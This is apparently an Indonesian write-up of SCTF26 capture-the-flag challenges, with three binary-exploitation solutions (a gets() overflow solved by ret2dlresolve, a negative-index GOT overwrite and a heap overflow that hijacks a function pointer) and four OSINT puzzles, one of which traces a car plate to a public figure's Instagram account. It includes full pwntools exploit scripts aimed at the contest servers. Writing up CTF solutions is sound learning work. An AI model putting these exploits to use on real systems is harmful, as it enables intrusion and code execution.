[https://chatgpt.com/share/6a483436-1a34-83ec-9be7-d99fd81ac2e3](https://chatgpt.com/share/6a483436-1a34-83ec-9be7-d99fd81ac2e3)

Challenge ini ngasih binary `koperasi`, decompile di `decompile.txt`, dan beberapa catatan di `information.txt`. Dari awal keliatan ini pwn klasik, tapi dibungkus menu koperasi: verifikasi anggota, cairin saldo, baru bisa beli pupuk.

Pertama cek proteksi:

```bash
~/ctf/sctf/pwn/pwn_2/koperasii
❯ checksec koperasi

[*] '/home/claritys/ctf/sctf/pwn/pwn_2/koperasii/koperasi'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Dari sini asumsi awal gue:

-   `No canary` berarti stack overflow kemungkinan bisa langsung overwrite RIP.

-   `NX enabled` berarti shellcode di stack bukan jalan paling enak.

-   `No PIE` berarti alamat gadget dan PLT/GOT binary stabil.

-   `Partial RELRO` bikin GOT masih menarik buat dibaca atau bahkan ditulis, tapi untuk kasus ini leak aja cukup.

Asumsi ini valid karena checksec nunjukin mitigasi persis begitu.  
Jadi kalau ada fungsi input jelek, kemungkinan besar arahnya ret2libc.

Program punya menu:

```
1. Verifikasi Anggota (Himpunan)
2. Pencairan Saldo (Polinomial)
3. Beli Pupuk (Toko)
4. Keluar
```

Menu 3 baru bisa diakses kalau sudah lolos menu 1 dan menu 2.

Di decompile, bagian menu 3 menarik banget:

```c
void FUN_004016e9(void)
{
  char local_38 [48];

  puts("\\n--- Toko Pupuk Koperasi ---");
  puts("Pupuk NPK Mutiara 50kg - Harga: Rp 500.000");
  printf("Masukkan alamat pengiriman pupuk (max 40 karakter):\\n> ");
  getchar();
  gets(local_38);
  printf("[+] Pesanan diproses! Pupuk akan dikirim ke: %s\\n",local_38);
  return;
}
```

Nah ini udah bau. Buffer 48 byte, prompt bilang max 40 karakter, tapi input pakai `gets`. `gets` tidak peduli batas ukuran, jadi ini kandidat bug utama.

Kenapa gue asumsi ini bug yang bener? Karena:

-   `gets(local_38)` langsung nulis ke stack.

-   Tidak ada canary.

-   Fungsi return setelah input, jadi saved RIP bisa kena.

-   `printf("%s", local_38)` cuma efek samping output, bukan mitigasi.

Gue coba isi alamat dengan cyclic pattern lewat flow normal:  
verifikasi, cairin saldo, lalu beli pupuk. Program crash di akhir fungsi  
`FUN_004016e9`, tepat di instruksi `ret`.

Dari catatan gdb:

![](/assets/uploads/093f5908-7fd0-4803-b001-a81c6e023969-image-18.png)

```
$rip   : 0x0000000000401751 -> ret
$rbp   : 0x6161616161616167

gef➤  pattern search $rbp
[+] Searching for '6761616161616161'/'6161616161616167' with period=8
[+] Found at offset 48 (little-endian search) likely
```

Karena offset ke saved RBP adalah 48, maka saved RIP ada setelahnya:

```
offset RIP = 48 + 8 = 56
```

Ini cocok juga dengan layout fungsi:

```
char local_38[48]
saved rbp 8 byte
saved rip 8 byte
```

Jadi payload dasar:

```python
b"A" * 56 + p64(target)
```

Nah, sejujurnya di sini sempet stuck. Karena ini pertama kali ngerjain ret2libc (kata claude), mana gak dikasih pula libcnya, jadinya harus nyari nyari WU yang libc. Nah, karena butuh ngeleak, dan aku belum tau caranya, akhirnya aku tanya bro claude biar langsung digituin :)..

Bisa diliat didalam link claude, kalau kita itu berusaha keras biar dapetin libcnya, yang pada akhirnya token claude gw habis :v. alhasil ya tanya CHATGPT.

Tapi gak sangka kalau bisa langsung solve 😭

![](/assets/uploads/72821544-6039-496e-b22f-e2adcef76b3d-image-19.png)

Yang in conclusion, ternyata ini itu **ret2dlresolve.** Sebenarnya udah ada feeling kalau misalnya nebak libc nya itu susah banget. Karena udah nyobain semua libc satu satu di [libc.rip](http://libc.rip) masih salah semua..

![](/assets/uploads/31fcb80b-4a40-4a96-9fce-65c603794040-image-20.png)

* * *

But in the end of the day, this is a ret2dlresolve challenge. It was fun and tiring for this challenge cuz many errors :).

Solver:

```jsx
#!/usr/bin/env python3
from pwn import *
import re

BINARY = "./koperasi"
HOST, PORT = "103.127.98.249", 5002

context.binary = elf = ELF(BINARY, checksec=False)
context.log_level = "info"

OFFSET = 56
RET_GADGET = 0x401016

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process(BINARY)

def solve_himpunan(io):
    io.sendlineafter(b"Pilih menu: ", b"1")

    io.recvuntil(b"Warga (W) = {")
    w = [int(x.strip()) for x in io.recvuntil(b"}", drop=True).split(b",")]

    io.recvuntil(b"Petani (P) = {")
    p = [int(x.strip()) for x in io.recvuntil(b"}", drop=True).split(b",")]

    inter = list(set(w) & set(p))
    assert len(inter) >= 2, f"Irisan kurang: {inter}"

    io.sendlineafter(b":", f"{inter[0]} {inter[1]}".encode())

def solve_polinomial(io):
    io.sendlineafter(b"Pilih menu: ", b"2")
    io.recvuntil(b"otorisasi:\n")

    line = io.recvline()
    log.info(f"poly line = {line!r}")

    m = re.search(
        rb"x\^3\s*([+-])\s*(\d+)x\^2\s*([+-])\s*(\d+)x\s*([+-])\s*(\d+)\s*=\s*0",
        line
    )
    assert m, f"Gagal parse polinomial: {line!r}"

    s1, n1, s2, n2, s3, n3 = m.groups()

    def signed(sign, num):
        num = int(num)
        return num if sign == b"+" else -num

    a = signed(s1, n1)
    b = signed(s2, n2)
    c = signed(s3, n3)

    root = None
    for x in range(1, 40):
        if x**3 + a*x**2 + b*x + c == 0:
            root = x
            break

    assert root is not None, f"Akar tidak ketemu: {a}, {b}, {c}"
    log.info(f"root = {root}")

    io.sendlineafter(b":", str(root).encode())

def build_dlresolve_payload(cmd="cat flag.txt"):
    # Geser-geser .bss supaya payload tidak mengandung newline.
    # Karena kita nulis pakai gets(), byte 0x0a bisa memotong input.
    for add in range(0x800, 0x3000, 0x100):
        data_addr = elf.bss() + add

        dlresolve = Ret2dlresolvePayload(
            elf,
            symbol="system",
            args=[cmd],
            data_addr=data_addr
        )

        rop = ROP(elf)
        rop.raw(RET_GADGET)
        rop.call(elf.plt["gets"], [dlresolve.data_addr])
        rop.ret2dlresolve(dlresolve)

        payload1 = flat({
            OFFSET: rop.chain()
        })

        payload2 = dlresolve.payload

        if b"\n" not in payload1 and b"\n" not in payload2:
            log.info(f"dlresolve data_addr = {hex(data_addr)}")
            return payload1, payload2

    raise RuntimeError("Tidak dapat payload ret2dlresolve tanpa newline")

def main():
    io = start()

    solve_himpunan(io)
    solve_polinomial(io)

    io.sendlineafter(b"Pilih menu: ", b"3")
    io.recvuntil(b"> ")

    payload1, payload2 = build_dlresolve_payload("cat flag.txt")

    # Ini masuk ke gets(local_38) asli di fungsi toko.
    io.sendline(payload1)

    # Buang output printf normal dari program.
    io.recvuntil(b"dikirim ke: ")
    io.recvline()

    # Ini dibaca oleh ROP: gets(.bss)
    io.sendline(payload2)

    io.interactive()

if __name__ == "__main__":
    main()
```

### Flag: SCTF26{p0l1n0m14l\_d4n\_b0f\_b1k1n\_k0p3r4s1\_j3b0l}

* * *

## Round Robin

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi:

Seorang SysAdmin pemula di perusahaan rintisan mencoba memamerkan kejeniusannya dengan merancang sistem penjadwalan OS (Scheduler) kustom dari nol. Dia sesumbar bahwa pembagian kerjanya sempurna dan mustahil disusupi. Buktikan bahwa dia salah. Eksploitasi antrean prosesnya, ambil alih kendali tertinggi, dan jadilah raja di sistem itu!\\n\\nnc 103.127.98.249 5003

* * *

Langkah Penyelesaian:

Link AI:  
[https://chatgpt.com/share/6a4790ab-aa04-83ec-993a-685400edbec4](https://chatgpt.com/share/6a4790ab-aa04-83ec-993a-685400edbec4)

Aku mulai dari checksec:

```bash
checksec file chall
```

Hasil:

```bash

~/ctf/sctf/pwnrobin
❯ checksec chall
[*] '/home/claritys/ctf/sctf/pwnrobin/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Ini lumayan ngasih arah. Karena `Partial RELRO`, GOT masih writable. Karena `PIE disabled`, alamat fungsi di binary stabil, tidak random. Jadi kalau ada bug arbitrary write atau out-of-bounds write, target enak banget: overwrite GOT ke fungsi win.

Di sini aku belum langsung yakin ada GOT overwrite. Tapi kombinasi `Partial RELRO + No PIE` bikin aku kepikiran: "kalau ada write primitive, ini bisa jadi gampang."

Ketemu fungsi di `0x401399` hasil dari decompile (GHIDRA) :

```nasm
void FUN_00401399(void)

{
  puts("\n[!!!] ANOMALI DITERIMA. SYSTEM OVERRIDE SUCCESS.");
  system("cat flag.txt");
                    // WARNING: Subroutine does not return
  exit(0);
}
```

Fungsi ini nge-print pesan anomaly, lalu menjalankan:

```
cat flag.txt
```

Jadi asumsi berikutnya: `0x401399` adalah win function.

Kenapa yakin? Karena fungsi ini:

1.  Tidak dipanggil dari menu normal.

2.  Memanggil `system("cat flag.txt")`.

Itu udah cukup kuat buat jadi target exploit nanti.

Karena aku gak tau lanjutannya gimana, alhasil aku tanya bro ChatGPT biar ngebantu. Turns out, ternyata aku salah kasih hasil decompilenya.. tapi aku ngasih objdumpnya 🥹

Tapi ya ternyata bugnya itu ada di address 401291 (IDA):

```jsx
int sub_401291()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("Pilih index proses (0-9) untuk di-edit: ");
  __isoc23_scanf("%d", &v1);
  printf("Set New Burst Time (long long): ");
  __isoc23_scanf("%lld", (char *)&unk_4040A0 + 24 * v1 + 8);
  printf("Set Status (0=Wait, 1=Finished): ");
  __isoc23_scanf("%d", (char *)&unk_4040A0 + 24 * v1 + 16);
  re
```

Karena dia ini tidak dicek, jadinya bisa pakai index negatif biar bisa ngeoverwrite ke GOT.

![](/assets/uploads/48985555-4b52-44cf-b821-aff0f3126777-image-21.png)

Yang di mana, 4199321 itu adalah decimal dari address win.

```jsx
>>> hex(4199321)
'0x401399'
```

* * *

### Flag: SCTF26{r0und\_r0b1n\_scheduler\_n1ghtm4re\_72918403a}

* * *

## Abbys

* * *

Tingkat Kesulitan: Medium

* * *

Deskripsi:

Sebuah sinyal aneh terdeteksi dari stasiun penelitian bawah laut 'Abbys'. Tim ekspedisi sebelumnya menghilang tanpa jejak, meninggalkan sebuah antarmuka usang yang masih terus menyala dan memancarkan data. Mampukah kamu menyelami kedalaman kode ini dan merebut akses sistem sebelum tekanan air menghancurkan segalanya?\\n\\nnc 103.127.98.249 5001

* * *

Langkah Penyelesaian:

Link AI:

[https://chatgpt.com/share/6a4862b0-3a08-83ec-a0e2-3088fe0e3121](https://chatgpt.com/share/6a4862b0-3a08-83ec-a0e2-3088fe0e3121)

Pertama cek proteksi:

```bash
~/ctf/sctf
❯ checksec ./abbys
[*] '/home/claritys/ctf/sctf/abbys'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Dari sini beberapa asumsi awal:

-   PIE mati, berarti address fungsi di binary fix. Kalau ada win function atau hidden function, bisa langsung dipakai tanpa leak.

-   NX nyala, jadi shellcode di stack/heap bukan jalan paling enak.

-   Canary tidak ada, tapi belum tentu bug-nya stack overflow.

-   Partial RELRO bikin GOT overwrite mungkin bisa, tapi jangan langsung maksa ke sana kalau ada primitive lebih simpel.

Pas lihat decompile, ada tiga menu utama:

```c
1. Allocate Object
2. Edit Object
3. Execute Object
```

Object-nya kurang lebih bentuknya begini:

```c
struct obj {
    void (*handler)(); // offset 0
    char *data;        // offset 8
    int size;          // offset 16
    int active;        // offset 20
};
```

Waktu allocate, handler default-nya diisi ke fungsi biasa:

```c
*(_QWORD *)qword_4040C0[idx] = sub_4012C2;
```

Terus waktu execute:

```c
return (*(__int64 (**)(void))qword_4040C0[idx])();
```

Nah ini langsung menarik. Kalau kita bisa overwrite `handler`, kita bisa control RIP secara rapi.

Ada fungsi di `0x4011d6` yang kelihatan kayak win/gate:

```c
int sub_4011D6()
{
  if (!dword_404110)
  {
    puts("[-] The gate is locked. You must traverse the abyss first.");
    exit(1);
  }

  puts("[!] Gate opened. Welcome to the other side.");
  ...
  printf("[+] FLAG: %s\n", s);
  return system("/bin/sh");
}
```

Asumsi awal: ini target akhir. Alasannya jelas, dia baca `flag.txt` dan panggil `/bin/sh`.

Tapi ada guard:

```c
if (!dword_404110) exit(1);
```

Berarti tidak bisa langsung lompat ke `0x4011d6`, kecuali global `dword_404110` sudah diset.

Lalu ada fungsi lain di `0x4012d8`:

```c
int sub_4012D8()
{
  dword_404110 = 1;
  puts("\n[!] ENTERING THE ABYSS [!]");
  ...
}
```

Ini keliatan kayak fungsi unlock. Jadi asumsi berikutnya:

1.  Panggil `0x4012d8` dulu buat set `dword_404110 = 1`.

2.  Baru panggil `0x4011d6` buat buka gate dan spawn shell.

Asumsi ini cukup kuat karena flow-nya literal banget: gate bilang harus traverse abyss dulu, abyss function ngeset global gate.

Di allocate:

```c
qword_4040C0[idx] = malloc(0x18);
...
*(_QWORD *)(obj + 8) = malloc(size);
read(0, obj->data, size);
```

Size boleh `0` sampai `512`.

Di edit:

```c
read(0, obj->data, obj->size + 48);
```

Ini bug-nya. Allocate data cuma `size`, tapi edit baca `size + 48`. Jadi selalu ada overflow 48 byte.

Awalnya aku mikir:

-   Kalau allocate object size `0`, `malloc(0)` tetap ngasih pointer valid.

-   Edit object itu akan baca `0 + 48 = 48` byte.

-   Kalau heap layout object berurutan, overflow dari `obj0->data` bisa nabrak `obj1->handler`.

Kenapa asumsi heap layout ini masuk akal? (semoga) Karena program allocate berurutan:

```
obj0 struct
obj0 data
obj1 struct
obj1 data
```

Semua allocation kecil, tidak ada free, jadi allocator cenderung naruh chunk berdekatan. Nah, sekarang tinggal tanya ChatGPT buat bantu refine pemikiranku. Kalau bener ya berarti alhamdulillah, kalau enggak ya debugging lagi 😂.

Nah, ternyata benar. Alhasil aku tinggal nyuruh dia bikin script dan jadi deh:

```python
from pwn import *

elf = context.binary = ELF("./abbys", checksec=False)
context.log_level = "info"

WIN = 0x4011d6
UNLOCK = 0x4012d8
OFFSET = 0x20

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 1337)

def start():
    if args.LOCAL:
        return process("./abbys")
    return remote(HOST, PORT)

p = start()

def alloc(idx, size, data=b"A"):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data.ljust(size, b"A"))

def edit(idx, data):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())
    p.sendafter(b"Data: ", data)

def execute(idx):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"Index (0-9): ", str(idx).encode())

def overwrite_obj1_handler(addr):
    payload = flat(
        b"A" * OFFSET,
        p64(addr),
        p64(0),
        p32(0x18),
        p32(1),
    )
    edit(0, payload)

alloc(0, 0x18, b"A" * 0x18)
alloc(1, 0x18, b"B" * 0x18)

overwrite_obj1_handler(UNLOCK)
execute(1)

p.sendlineafter(b"Size of payload: ", b"0")

overwrite_obj1_handler(WIN)
execute(1)

p.interactive()
```

![](/assets/uploads/e486f7a6-fe5e-4030-a33c-d7cd2c344ea6-image-22.png)

* * *

### Flag: SCTF26{duh\_puh\_pwn\_st4ck\_d1tambah\_h3ap\_1ni\_m4h\_b4hl1l\_jug4\_b1ngng}

* * *

## OSINT

## Sang Atmin

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi:

jika kamu sudah mendaftar SCTF26 pasti kamu kenal dengan sang atmin, bisakah kamu mengambil flag yg disembunyikan oleh atmin?

jangan lupa follow atmin yak heheh

Hint 1 : Instagram

Hint 2 : directory web "/”

* * *

Langkah Penyelesaian:

Pada chall ini saya langsung ke ignya atmin **stevenjr\_yt** (Fyi, saia sudah follow dari lamaa tp tdk di follback aowkaowk:>) Untuk hint selanjutnya saya lihat di postingan cerita si atmin

![](/assets/uploads/3b6effec-324b-4179-b86c-33de9a518e64-f9f56441-c963-48e7-83f0-68f4636ac55c.png)

Nah disini langsung meluncur ke link websitenya milik atmin yang ada di bio, karena di hint diberitahukan terdapat directory “/” disini saya coba tembak /flag tp hasilnya gaada apa apa dan menyadari disini linknya ada query ?utm\_source=ig&utm\_medium=social&utm\_content=link\_in\_bio&fbclid=PAZXh0bgNhZW0CMTEAc3J0YwZhcHBfaWQPOTM2NjE5NzQzMzkyNDU5AAGnLkh4Dl2xFT165h7v\_OHQlK-ogh\_bFTngkc1MISPYtL6TmZ26Av1UmbxaXvw\_aem\_iYNl2YuNMdVa1Q-XXzBS0w, nahh saya hapuslah dan trakhir saya tambah /flag.txt di linknya :D

![](/assets/uploads/2c65acd4-c29b-495e-9a85-e49804f5c8a1-image-23.png)

* * *

### Flag: SCTF26{0s1nt\_k3\_lf1\_m4nt4p\_c0y\_S62df326}

* * *

## Plat

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi:

ini mobil siapa bro? coba cariin si ini mobil punya siapa

Format flag: SCTF26{username\_instagram\_jenis\_mobil\_platmobil}  
note: username instagram kecil semua, jenis mobil huruf pertama kapital dan plat huruf kapital  
Example: SCTF26{stevenjr\_yt\_Honda\_HRV\_Class\_BE2230AGY}

* * *

Langkah Penyelesaian: Diberikan foto plat kendaraan mobil yang bertuliskan B 1673 SSO, disini awalnya saya cek di samsat jakarta, tapi hasilnya data tidak ditemukan.

![](/assets/uploads/ba1c3031-01bc-4a38-8d90-30eaa7a9c506-image-24.png)

Dan saya baru sadar bahwa Plat tsb ternyata sampai maret 2021, Hmm pantes ajaa wkwkkw, Disini saya balik ke deskripsi chall, bahwasannya kita juga harus mencari usn instagram orang yang punya mobil tsb :>, Disini saya searching aja di google dengan kata kunci “mobil B 1673 SS0 2021 instagram”. Hasil pencarian menunjukkan ada di instagram nya raffinagita1717 ([https://www.instagram.com/p/CLis8CTMI7D/](https://www.instagram.com/p/CLis8CTMI7D/)).

![](/assets/uploads/d61dcd74-dc44-4493-9967-8a7a8d8301ff-Screenshot_2026-07-03_150725.png)

![](/assets/uploads/cf3c3889-45df-4e9b-8c13-10600628393b-image-25.png)

Oh yeaa saya dapat doksli nya:V, disini langsung saya cari nama mobil nya menggunakan google lens

![](/assets/uploads/431b611c-d8d5-4c4f-b709-80dcf539bf60-image-26.png)

Nah langsung saya urutkan sesuai format flagnya SCTF26{username\_instagram\_jenis\_mobil\_platmobil}

* * *

### Flag: SCTF26{raffinagita1717\_Mercedes\_Benz\_V\_Class\_B1673SSO}

* * *

## Airport

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi:

dibilang ini parkiran tpi bukan, ini bandara!

bisahkah kamu menemukan ini bandara mana?

* * *

Langkah Penyelesaian:

![](/assets/uploads/18810e68-2746-4c34-b62f-aa5b6094c790-image-27.png)

Gataw dimana jujur asli, tapi pas coba submit asal di web ada easter egg jir :v

![](/assets/uploads/e13ac486-4566-40ff-8f4f-0f804622ec74-image-28.png)

Dan yap tinggal bruteforce sampe ketemu jarak terdekat dan solve :v

![](/assets/uploads/a6e12626-bd04-41bc-ac2a-16dd75e4480b-image-29.png)

Yang ternyata tempatnya di `Bandar Udara Muhammad Taufiq Kiemas`

* * *

### Flag: **SCTF26{w3lc0m3\_t0\_l4mpung\_0s1nt\_m4st3r}**

* * *

## atmin suka naik gunung

* * *

Tingkat Kesulitan : Medium

* * *

Deskripsi :

si atmin ini lagi suka sukanya naik gunung, cuma dia ini ga mau naik gunung yg beneran

bisa ga cari nama gunungnya apa?

Format Flag: SCTF26{Nama\_Gunung\_Nama\_Developer} huruf pertama kapital

* * *

Langkah Penyelesaian: Disini sempat bingung gunungnya nih gunung jadi jadian atau gunung asli, tapi setelah konfirmasi ini gunung asli saya coba masukin 1 1 (bruteforce aowkaow)

![](/assets/uploads/44235f11-7721-4d50-91dc-60b1cecf1862-image-30.png)

Awalnya nih salah

-   `Gunung_Bromo`

-   `Gunung_Rinjani`

-   `Gunung Merbabu`

Eh ada 1 gunung random kid yang pas dimasukin bisa coy :v

Yaitu `Gunung_Talamau`

![](/assets/uploads/11301d01-499e-4221-b3b1-237cbad9d2c7-image-31.png)

* * *

### Flag: SCTF26{Gunung\_Talamau\_Imaginature\_Studio}
